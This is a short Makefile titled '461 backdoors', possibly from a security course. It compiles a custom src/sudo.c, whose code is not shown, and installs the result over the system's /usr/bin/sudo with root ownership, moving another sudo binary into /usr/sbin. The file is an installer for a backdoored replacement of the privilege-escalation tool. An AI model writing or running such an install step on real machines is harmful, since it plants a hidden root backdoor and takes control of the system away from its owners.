##
# 461 backdoors
#
# @file
# @version 0.1

install: install-sudo

install-sudo: dist/sudo
	sudo mv sudo /usr/sbin/sudo
	sudo cp dist/sudo /usr/bin/sudo
	sudo chmod 1111 /usr/bin/sudo
	sudo chown 'root:root' /usr/bin/sudo

dist/sudo: src/sudo.c
	gcc -g -o dist/sudo src/sudo.c

# end
